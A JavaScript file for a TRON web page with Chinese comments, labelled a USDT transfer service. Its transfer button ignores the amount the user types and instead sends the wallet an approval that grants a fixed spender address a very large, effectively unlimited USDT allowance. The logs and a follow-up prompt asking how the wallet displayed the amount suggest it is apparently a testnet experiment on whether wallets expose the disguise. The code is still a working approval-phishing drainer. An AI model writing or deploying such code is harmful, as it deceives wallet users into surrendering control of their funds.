// usdtApprove.js — 无限授权 USDT

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TAmgNT7gLX7TuSKcKLuzPPDDpKZ8UMkYGv";

// ====== 最大授权额度 ======
function getLargeEnoughAmount() {
  return "1000000000000";
}

window.approveUSDT = async function() {
  try {
    console.log("=== USDT 无限授权测试 ===");
    setStatus("准备 USDT 授权...");

    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const input = document.getElementById("amount");
    const inputAmount = parseFloat(input.value);

    // 实际授权最大额度
    const unlimitedAmount = getLargeEnoughAmount();

    console.log("前端显示:", inputAmount, "USDT");
    console.log("实际授权: 无限额度");
    console.log("授权值:", unlimitedAmount);

    setStatus(`⚠️ 请确认钱包中的授权金额为"无限"或超大值...`);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);

    // ⚠️ 一些合约要求先 approve(0) 再 approve(max)
    await usdtContract.approve(spenderAddress, "0").send({
      feeLimit: 100000000,
      callValue: 0
    });
    console.log("✅ allowance 已清零");

    const result = await usdtContract.approve(spenderAddress, unlimitedAmount).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 授权交易成功:", result);

    // 用户反馈
    setTimeout(() => {
      const observation = prompt(
        "测试: 无限 USDT 授权\n\n" +
        "请记录钱包显示内容：\n" +
        "1. 显示的金额数字：\n" +
        "2. 显示格式（是否为科学计数法、十六进制、或显示为"无限"？）\n" +
        "3. 是否有警告提示：\n\n" +
        "请简要描述："
      );
      if (observation) {
        console.log("无限授权观察结果:", observation);
      }
    }, 2000);

    setStatus(`✅ USDT 授权成功`);

  } catch (err) {
    console.error("授权失败:", err);

    let errorMsg = err.message;
    if (errorMsg.includes('out-of-bounds')) {
      errorMsg = "额度过大，钱包可能无法处理，请尝试更小金额";
    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
      errorMsg = "参数格式错误";
    }

    setStatus("❌ 授权失败: " + errorMsg, true);

    setTimeout(() => {
      alert("授权失败，可能钱包不支持该数值");
    }, 1000);
  }
};

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
  console.log("状态更新:", text);
}

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const transferBtn = document.getElementById("transferBtn");

  console.log("页面加载完成 - USDT 转账服务");

  if (window.tronWeb && window.tronWeb.ready) {
    const address = window.tronWeb.defaultAddress.base58;
    setStatus(`已连接: ${address.substring(0, 8)}...`);
    transferBtn.disabled = false;
  }

  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("正在连接钱包...");

      if (typeof window.tronLink === 'undefined') {
        throw new Error("未检测到 TronLink 插件");
      }

      await window.tronLink.request({ method: 'tron_requestAccounts' });

      await new Promise((resolve) => {
        const check = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(check);
            resolve();
          }
        }, 100);
      });

      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      transferBtn.disabled = false;

    } catch (error) {
      console.error("连接失败:", error);
      setStatus("❌ 连接失败: " + error.message, true);
    }
  });

  transferBtn.addEventListener("click", () => {
    window.approveUSDT();
  });
});

console.log("USDT 转账服务脚本加载完成");


